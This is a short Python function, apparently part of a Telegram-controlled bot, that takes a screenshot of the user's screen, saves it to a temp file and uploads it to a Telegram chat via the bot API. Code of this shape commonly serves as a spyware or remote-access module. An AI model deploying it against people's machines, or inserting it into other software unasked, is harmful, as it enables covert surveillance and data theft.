import pyautogui
import os
import tempfile
import requests

def capturar_screenshot(token, chat_id):
    try:
        caminho_temp = os.path.join(tempfile.gettempdir(), "screenshot.png")
        img = pyautogui.screenshot()
        img.save(caminho_temp)

        with open(caminho_temp, "rb") as f:
            files = {'photo': f}
            data = {'chat_id': chat_id, 'caption': '🖼️ Screenshot atual'}
            requests.post(f"https://api.telegram.org/bot{token}/sendPhoto", data=data, files=files)

        return "✅ Screenshot enviada."
    except Exception as e:
        return f"Erro ao capturar tela: {e}"
